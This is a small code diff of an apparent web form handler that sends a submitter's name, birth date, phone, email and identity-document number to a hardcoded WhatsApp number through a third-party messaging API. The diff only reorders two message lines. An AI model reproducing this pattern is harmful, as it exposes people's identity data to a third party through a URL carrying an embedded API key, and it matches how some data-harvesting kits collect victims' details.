@@ -52,8 +52,8 @@ export default async function handler(req, res) {
         `👤 ${prenom} ${nom}\n` +
         `🎂 ${dob}\n` +
         `📞 ${phone}\n` +
-        `✉️ ${email}\n` +
-        `🪪 ${idType} – ${idNumber}`
+        `🪪 ${idType} – ${idNumber}\n` +
+        `✉️ ${email}`
       );
       await fetch(`https://api.callmebot.com/whatsapp.php?phone=224622269738&text=${msg}&apikey=2895723`);
     } catch (_) {}
